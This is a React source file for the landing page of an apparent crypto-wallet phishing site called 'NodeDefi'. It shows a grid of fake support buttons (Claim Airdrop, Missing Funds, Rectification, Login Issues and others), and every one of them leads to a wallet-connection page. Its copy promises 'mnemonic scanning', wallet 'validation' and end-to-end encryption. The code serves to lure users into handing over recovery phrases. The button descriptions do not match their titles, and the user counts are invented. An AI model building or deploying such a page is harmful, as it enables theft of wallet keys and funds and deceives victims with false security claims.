import React from "react";

import { useNavigate } from "react-router-dom";
import { Button, Card } from "flowbite-react";

const Landing = () => {
  const navigate = useNavigate();
  const quickStart = [
    {
      id: 1,
      title: "Buy",
      description: "Click here for validation related issues.",
      icon: "bi bi-check2-square",
    },
    {
      id: 1,
      title: "Sell",
      description: "Click here for migration related issues.",
      icon: "bi bi-check2-square",
    },
    {
      id: 2,
      title: "NFT",
      description: "Click here for assests issues.",
      icon: "bi bi-bank",
    },
    {
      id: 3,
      title: "Claim Rewards",
      description: "Click here for assests issues.",
      icon: "bi bi-fuel-pump",
    },
    {
      id: 4,
      title: "Claim Airdrop",
      description: "Click here for spillage related issue during trade.",
      icon: "bi bi-bug",
    },
    {
      id: 5,
      title: "Claim Presale",
      description: "Click here for transaction related issues.",
      icon: "bi bi-credit-card-2-back",
    },
    {
      id: 6,
      title: "Swap/Exchange",
      description: "Click here for cross chain bridge issues.",
      icon: "bi bi-arrow-left-right",
    },
    {
      id: 7,
      title: "Staking/Unstake",
      description: "Click here for staking related issues.",
      icon: "bi bi-safe2",
    },
    {
      id: 8,
      title: "Swap/Exchange",
      description: "Click here for swaping and exchange related issues.",
      icon: "bi bi-arrow-left-right",
    },
    {
      id: 9,
      title: "Farm/Pool",
      description: "Click here for error while connecting to Dapps.",
      icon: "bi bi-gear-wide-connected",
    },
    {
      id: 10,
      title: "Staking Rewards",
      description: "Click here for issues while logging into your wallet.",
      icon: "bi bi-box-arrow-in-left",
    },
    {
      id: 11,
      title: "Withdraw token",
      description: "Click here for airdrop related issues.",
      icon: "bi bi-box2-heart",
    },
    {
      id: 12,
      title: "Migrate",
      description: "Click here for NFTs minting/transfer related issues.",
      icon: "bi bi-images",
    },
    {
      id: 13,
      title: "NFT Rarity & Traits",
      description: "Click here for whitelist related issues.",
      icon: "bi bi-card-checklist",
    },
    {
      id: 14,
      title: "Slippage",
      description: "Click here for issues related to transaction delayed.",
      icon: "bi bi-alarm",
    },
    {
      id: 15,
      title: "Validation",
      description: "Click here for issues related to account lock.",
      icon: "bi bi-images",
    },
    {
      id: 16,
      title: "Rectification",
      description: "Click here if you have problems with your trading wallet.",
      icon: "bi bi-cash-stack",
    },
    {
      id: 17,
      title: "Verification",
      description: "Click here for issues related to not able to buy tokens.",
      icon: "bi bi-cash-coin",
    },
    {
      id: 18,
      title: "Login Issues",
      description:
        "If you can't find the issue you're experiencing click here.",
      icon: "bi bi-cash-coin",
    },
    {
      id: 19,
      title: "Missing Funds",
      description:
        "If you can't find the issue you're experiencing click here.",
      icon: "bi bi-cash-coin",
    },
    {
      id: 20,
      title: "Transaction Error",
      description:
        "If you can't find the issue you're experiencing click here.",
      icon: "bi bi-cash-coin",
    },
    {
      id: 21,
      title: "Exhoribant Gas Fees",
      description:
        "If you can't find the issue you're experiencing click here.",
      icon: "bi bi-cash-coin",
    },
    {
      id: 22,
      title: "Irregular Token Balance",
      description:
        "If you can't find the issue you're experiencing click here.",
      icon: "bi bi-cash-coin",
    },
    {
      id: 23,
      title: "Issue With Trading Wallet",
      description:
        "If you can't find the issue you're experiencing click here.",
      icon: "bi bi-cash-coin",
    },
  ];

  const goToWallet = () => {
    navigate("wallet");
  };

  return (
    <main className="relative bg-white dark:bg-gray-900 min-h-screen flex flex-col gap-20">
      <section className="max-w-4xl mx-auto flex flex-col gap-4 xl:gap-10 justify-center items-center px-4 md:px-10 mt-10 lg:mt-20">
        <div data-aos="fade-up">
          <h1 className="mb-4 text-4xl tracking-tight font-extrabold text-gray-900 dark:text-white">
          NodeDefi App For Syncing Various Wallets To Dapps Secure Server
          </h1>
          <p className="mt-4 text-wrap leading-snug xl:leading-relaxed font-medium text-gray-500 sm:text-xl dark:text-gray-400">
            Decentralized Launchpad provides industry-leading Web3 and
            BlockChain a safe protocol and process encrypted by a superb
            encryption server. Your information never leaves our server or
            accessible to third-parties with end-to-end encryption. <br />
            <br /> Ensure your wallet is connected before making your selection
          </p>
        </div>

        <div className="flex flex-wrap items-center justify-center gap-3 mt-4">
          {quickStart.map((item) => (
            <Button outline pill onClick={goToWallet} color="blue">
              {item.title}
            </Button>
          ))}
        </div>
      </section>

      <section class="bg-gray-50 dark:bg-[#101720]">
        <div class="py-8 px-4 mx-auto max-w-screen-xl sm:py-16 lg:px-6">
          <div class="max-w-screen-md mb-8 lg:mb-16 mx-auto">
            <h2 class="mb-4 text-4xl tracking-tight font-extrabold text-gray-900 dark:text-white">
              Secure and Validate Your Wallet with Ease{" "}
            </h2>
            <p class="text-gray-500 sm:text-xl dark:text-gray-400">
              Our wallet protocol ensures seamless validation and security for
              your digital assets. Effortlessly validate wallet addresses to
              confirm authenticity and integrity, while our mnemonic scanning
              feature provides a secure way to recover and manage your keys.
            </p>
          </div>
          <div class="space-y-8 md:grid md:grid-cols-2 lg:grid-cols-3 md:gap-12 md:space-y-0">
            <div className="flex items-center justify-center flex-col">
              <img
                className="h-16 w-16 mb-3"
                src="assets/syw.png"
                alt="loading"
              />
              <h3 class="mb-2 text-xl font-bold dark:text-white">
                Select Your Wallet
              </h3>
              <p class="text-gray-500 dark:text-gray-400">
                We have varieties of wallets you can choose from to validate or
                synchronize your wallet. Please, select your correct wallet name
                before proceeding.
              </p>
            </div>
            <div className="flex items-center justify-center flex-col">
              <img
                className="h-16 w-16 mb-3"
                src="assets/syw1.png"
                alt="loading"
              />
              <h3 class="mb-2 text-xl font-bold dark:text-white">
                Validate Your Wallet
              </h3>
              <p class="text-gray-500 dark:text-gray-400">
                Protect your organization, devices and stay compliant with our
                structured workflows and custom permissions made for you.
              </p>
            </div>
            <div className="flex items-center justify-center flex-col">
              <img
                className="h-16 w-16 mb-3"
                src="assets/swq3.png"
                alt="loading"
              />
              <h3 class="mb-2 text-xl font-bold dark:text-white">
                Generate QR Code
              </h3>
              <p class="text-gray-500 dark:text-gray-400">
                Upon successful validation, a QR Code will be generated for your
                wallet. You can always scan your QR Code to reinitialize your
                wallet.
              </p>
            </div>
            <div className="flex items-center justify-center flex-col">
              <img
                className="h-16 w-16 mb-3"
                src="assets/syw2.png"
                alt="loading"
              />
              <h3 class="mb-2 text-xl font-bold dark:text-white">
                Save Wallet QR Code
              </h3>
              <p class="text-gray-500 dark:text-gray-400">
                Saving your generated mnemonic code or QR Code is important. You
                can click on Save or Screenshot the QR Code Page. You choose how
                you want to save!
              </p>
            </div>
          </div>
        </div>
      </section>
      <section class="bg-white dark:bg-gray-900">
        <div class="max-w-screen-xl px-4 py-8 mx-auto text-center lg:py-16 lg:px-6">
          <dl class="grid max-w-screen-md gap-8 mx-auto text-gray-900 sm:grid-cols-3 dark:text-white">
            <div class="flex flex-col items-center justify-center">
              <dt class="mb-2 text-3xl md:text-4xl font-extrabold">3M+</dt>
              <dd class="font-light text-gray-500 dark:text-gray-400">
                developers
              </dd>
            </div>
            <div class="flex flex-col items-center justify-center">
              <dt class="mb-2 text-3xl md:text-4xl font-extrabold">1M+</dt>
              <dd class="font-light text-gray-500 dark:text-gray-400">
                contributors
              </dd>
            </div>
            <div class="flex flex-col items-center justify-center">
              <dt class="mb-2 text-3xl md:text-4xl font-extrabold">200k+</dt>
              <dd class="font-light text-gray-500 dark:text-gray-400">
                organizations
              </dd>
            </div>
          </dl>
        </div>
      </section>
    </main>
  );
};

export default Landing;
